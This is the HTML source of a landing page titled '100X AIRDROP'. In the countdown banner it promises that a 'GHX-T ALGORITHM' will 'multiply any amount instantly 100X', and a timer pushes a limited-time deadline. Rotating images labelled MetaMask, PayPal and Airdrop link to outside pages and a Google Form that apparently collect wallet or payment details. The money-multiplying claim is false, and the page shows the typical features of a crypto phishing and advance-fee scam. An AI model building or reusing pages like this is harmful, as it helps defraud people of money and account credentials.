<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>100X AIRDROP</title>
    <style>
        /* Full Page Styling */
        body {
            margin: 0;
            overflow: hidden;
            background-color: black;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
        }

        /* Neon Border */
        .border {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: 10px solid #00faff;
            box-shadow: 0 0 40px #00faff;
            border-radius: 25px;
            pointer-events: none;
        }

        /* Countdown Timer (Smaller Size) */
        .countdown-container {
            margin-top: 10px;
            color: darkblue;
            font-size: 1rem;
            font-weight: bold;
            text-shadow: 0 0 10px white;
            background: rgba(255, 255, 255, 0.9);
            padding: 5px 15px;
            border-radius: 8px;
            box-shadow: 0 0 10px white;
            border: 2px solid darkblue;
            text-align: center;
            z-index: 2;
        }

        /* Title GIF */
        .title-gif {
            margin-top: 15px;
            max-width: 250px;
            z-index: 2;
        }

        /* Scrolling GIFs Container (Centered & Adjustable) */
        .gif-container {
            position: absolute;
            top: 50%;          /* Center vertically */
            left: 50%;         /* Center horizontally */
            transform: translate(-82%, -45%);  /* Adjust -50% to fine-tune horizontal positioning */
            width: 90%;
            height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            z-index: 1;
        }

        /* Individual GIFs */
        .gif-container img {
            max-width: 350px;
            position: absolute;
            opacity: 0;
            transition: opacity 1s ease-in-out;
        }

        .gif-container img:first-child {
            opacity: 1;
        }

        /* Floating Emojis & Images */
        .floating {
            position: absolute;
            font-size: 2rem;
            user-select: none;
            pointer-events: none;
            animation: fall linear infinite;
        }

        .floating-img {
            position: absolute;
            max-width: 80px;
            user-select: none;
            pointer-events: none;
            animation: fall linear infinite;
        }

        @keyframes fall {
            from { transform: translateY(-100%); opacity: 1; }
            to { transform: translateY(100vh); opacity: 0; }
        }
    </style>
</head>
<body>

    <!-- Neon Border -->
    <div class="border"></div>

    <!-- Countdown Timer -->
    <div class="countdown-container">
        <strong>GHX-T ALGORITHM ‚Ñ¢Ô∏è¬©Ô∏è MULTIPLY ANY AMOUNT INSTANTLY 100X LIMITED TIME OFFER</strong><br>
        <span id="timer"></span>
    </div>

    <!-- Title GIF -->
    <img src="xx.gif" alt="100X Airdrop" class="title-gif">

    <!-- Scrolling GIFs (Centered) -->
    <div class="gif-container">
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="metamask.gif" alt="MetaMask"></a>
        <a href="https://fclmail.github.io/PAYPAL/"><img src="paypal.gif" alt="PayPal"></a>
        <a href="https://docs.google.com/forms/d/e/1FAIpQLSdV5AnOMcjMyaoaHnTmeMJgKONrU6rHXs_zyf6cOyFrzpThDg/viewform"><img src="airdrop.gif" alt="Airdrop"></a>
        <a href="https://google.ca"><img src="multiply.gif" alt="Multiply"></a>
        <a href="https://google.ca"><img src="limitedtimeoffer.gif" alt="Limited Time Offer"></a>
    </div>

    <script>
        // Countdown Timer to March 31, 2025
        function updateTimer() {
            const targetDate = new Date("March 31, 2025 00:00:00").getTime();
            setInterval(() => {
                const now = new Date().getTime();
                const timeLeft = targetDate - now;
                if (timeLeft < 0) {
                    document.getElementById("timer").innerHTML = "EXPIRED!";
                    return;
                }
                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
                document.getElementById("timer").innerHTML =  
                    `${days}d ${hours}h ${minutes}m ${seconds}s`;
            }, 1000);
        }
        updateTimer();

        // Scrolling GIFs Logic
        let currentGif = 0;
        const gifs = document.querySelectorAll(".gif-container img");
        function showNextGif() {
            gifs.forEach((gif, index) => {
                gif.style.opacity = index === currentGif ? "1" : "0";
            });
            currentGif = (currentGif + 1) % gifs.length;
        }
        setInterval(showNextGif, 4000);

        // Floating Emojis & Images
        const emojis = ["üòÉ", "üòÄ", "üòÑ", "üíµ", "üí∞", "üéÅ", "ü™Ç", "‚õΩ"];
        const images = ["yy.gif", "zz.png", "aa.png"];
        function createFloatingElement(type) {
            const element = document.createElement("div");
            element.classList.add("floating");
            if (type === "emoji") {
                element.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                element.style.fontSize = Math.random() * 1.5 + 1.5 + "rem";
            } else {
                element.classList.add("floating-img");
                const img = document.createElement("img");
                img.src = images[Math.floor(Math.random() * images.length)];
                img.style.width = Math.random() * 50 + 50 + "px";
                element.appendChild(img);
            }
            element.style.left = Math.random() * 100 + "vw";
            element.style.animationDuration = (Math.random() * 3 + 2) + "s";
            document.body.appendChild(element);
            setTimeout(() => element.remove(), 4000);
        }
        setInterval(() => createFloatingElement("emoji"), 500);
        setInterval(() => createFloatingElement("image"), 2000);
    </script>

</body>
</html>
